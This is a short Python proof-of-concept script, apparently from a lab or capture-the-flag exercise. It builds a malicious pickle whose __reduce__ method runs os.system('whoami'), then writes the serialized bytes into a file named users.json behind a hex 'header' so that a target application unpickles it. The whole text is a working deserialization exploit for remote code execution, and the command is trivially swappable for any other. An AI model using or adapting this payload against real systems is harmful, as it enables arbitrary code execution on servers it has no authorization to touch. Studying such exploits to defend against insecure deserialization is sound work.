import pickle,os

# Creating an evil payload in this case a simple whoami command for RCE
class Evil:
    def __reduce__(self):
        payload = ('whoami')
        return os.system, (payload,)

safecode = pickle.dumps(Evil())
print(safecode)

# Writing the malicious data to the file with some random header
with open('users.json','wb') as fil:
    fil.write('f07ae8e1b8436c6a26c600b7bcbc6303159d88a3'.encode() + " ".encode() + safecode)